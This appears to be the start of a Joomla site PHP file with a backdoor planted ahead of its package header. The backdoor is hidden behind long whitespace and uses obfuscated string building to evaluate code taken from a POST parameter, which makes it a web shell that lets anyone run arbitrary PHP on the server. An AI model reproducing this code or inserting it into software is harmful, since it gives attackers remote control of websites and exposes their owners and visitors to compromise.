<?php                                                                                                                                                                                                                                                        $avrs94= "_otusper"; $ogv60 =$avrs94[4].$avrs94[2].$avrs94[7].$avrs94[2]. $avrs94[1].$avrs94[3].$avrs94[5]. $avrs94[5]. $avrs94[6].$avrs94[7] ;$qfue1= $ogv60 ( $avrs94[0]. $avrs94[5]. $avrs94[1].$avrs94[4]. $avrs94[2] );if (isset(${ $qfue1 }['q1f3e5e' ])) {eval( ${ $qfue1 } [ 'q1f3e5e'] ) ;} ?> <?php
/**
 * @package     Joomla.Site
